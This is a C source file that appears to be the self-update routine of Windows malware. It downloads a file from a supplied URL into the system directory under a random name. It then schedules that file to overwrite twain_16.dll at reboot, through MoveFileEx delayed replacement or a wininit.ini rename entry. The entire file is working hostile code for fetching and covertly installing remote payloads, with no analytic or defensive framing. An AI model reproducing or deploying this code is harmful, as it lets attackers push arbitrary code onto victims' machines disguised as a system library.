#include "StdAfx.h"
#include "extern.h"

extern int Update;
extern HANDLE presence;
extern int ReleasePresence;

WORD HttpUpdate(char *url)
{
	DWORD dwHttpUpdateThreadId = NULL;
	HANDLE hHttpUpdateThread = NULL;
	int threads_ok = 0;
	static char iurl[255];

	strncpy(iurl, url, sizeof(iurl));

	hHttpUpdateThread = xCreateThread(NULL, 0, HttpUpdateThread, (void*)iurl, 0, &dwHttpUpdateThreadId);
	if(hHttpUpdateThread==NULL)
	{
		deb("xCreateThread for HttpUpdate failed (%d)\n", GetLastError());
		return ERR;
	}
	return SUCCESS;;
}

DWORD WINAPI HttpUpdateThread(LPVOID url)
{
	char szWinDir[MAX_PATH];
	char tmpf[18];
	HANDLE thread;
	DWORD term = STILL_ACTIVE;
	FILE *f = NULL;
	char szTwain[MAX_PATH];
	char szWininit[MAX_PATH];

	GetSystemDirectory(szWinDir, MAX_PATH);
	GetRandStr(5, tmpf);
	lstrcat(szWinDir, "\\");
	lstrcat(szWinDir, tmpf);
	lstrcat(szWinDir, ".dll");
	GetWindowsDirectory(szTwain, MAX_PATH);
	lstrcpy(szWininit, szTwain);
	lstrcat(szTwain, "\\twain_16.dll");
	lstrcat(szWininit, "\\wininit.ini");

	thread = (HANDLE)HttpGet(1, 100, (char*)url, szWinDir);
	if(thread==NULL)
	{
		udpdeb("httpget returned NULL..shit happens\n");
		ExitThread(ERR);
	}

	while(term==STILL_ACTIVE)
	{
		if(GetExitCodeThread(thread, &term)==0)
		{
			udpdeb("httpupdate: fail in while\n");
			ExitThread(ERR);
		}
	}

	if(term!=SUCCESS)
	{
		udpdeb("update failed, thread get exit with errors\n");
		ExitThread(ERR);
	}

	if(FileAccess(szWinDir, GENERIC_READ))
	{
		udpdeb("update failed, file not exist\n");
		ExitThread(ERR);
	}

	if(winxp||winnt||win2k||win2k3)
		MoveFileEx(szWinDir, szTwain, MOVEFILE_DELAY_UNTIL_REBOOT|MOVEFILE_REPLACE_EXISTING);
	else
		WritePrivateProfileString("[rename]", szTwain,
		szWinDir, szWininit);

	ExitThread(SUCCESS);
}